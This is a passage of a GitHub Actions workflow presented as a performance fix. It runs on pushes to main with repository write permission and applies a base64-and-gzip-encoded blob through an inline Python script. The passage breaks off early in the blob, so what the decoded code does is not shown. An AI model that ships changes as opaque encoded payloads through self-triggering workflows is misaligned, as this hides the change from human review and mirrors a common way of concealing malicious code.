name: Apply deferred section performance fix

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/apply-defer-performance-fix.yml

permissions:
  contents: write

jobs:
  apply-defer-performance-fix:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Apply deferred section performance patch
        shell: bash
        run: |
          python - <<'PY'
          import base64
          import gzip
          from pathlib import Path
          data = """
          H4sIAAAAAAAEAK1WXXPaOBR996+4wxOMwTaEpoQsGdJstn3ozLYJ030W1jV4aiRGlhNYhv++ki1A
